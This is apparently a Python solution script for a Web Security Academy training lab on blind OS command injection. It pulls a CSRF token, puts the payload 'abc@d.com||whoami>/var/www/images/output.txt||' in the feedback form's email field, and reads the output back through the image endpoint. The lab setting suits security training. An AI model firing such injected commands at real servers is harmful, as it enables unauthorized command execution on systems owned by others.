# Lab: Blind OS command injection with output redirection

import requests

base = "https://0a670020049b212b85a09e6100b5004b.web-security-academy.net"
s = requests.Session()

print("===========[step1] Check Product===============")
page_feedback=s.get(f"{base}/feedback")
# page_feedback_result=page_feedback.text
# print(page_feedback_result)
'''
[!] Found POST Method: 

                   <form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
                        <input required type="hidden" name="csrf" value="GmR2agMggMrVyjL1nOYTy9TL04yGxG4m">
                        <label>Name:</label>
                        <input required type="text" name="name">
                        <label>Email:</label>
                        <input required type="email" name="email">
                        <label>Subject:</label>
                        <input required type="text" name="subject">
                        <label>Message:</label>
                        <textarea required rows="12" cols="300" name="message"></textarea>
                        <button class="button" type="submit">
                            Submit feedback
                        </button>
                        <span id="feedbackResult"></span>
                    </form>
                    <script src="/resources/js/submitFeedback.js">
'''
# Get csrf value
if 'name="csrf"' in page_feedback.text:
    csrf_value = page_feedback.text.split('name="csrf" value="')[1].split('"')[0]


PAYLOAD="abc@d.com||whoami>/var/www/images/output.txt||"
print("===========[step2] inject into email (found in previous lab)===============")
# configure feedback_data
data = {"csrf": csrf_value, "name": "1", "email": PAYLOAD,
        "subject": "3", "message": "45"}
s.post(f"{base}/feedback/submit", data=data, timeout=30)

print("===========[step3] read the redirected output via image endpoint===============")
r = s.get(f"{base}/image", params={"filename": "output.txt"})
print(r.status_code, r.text.strip())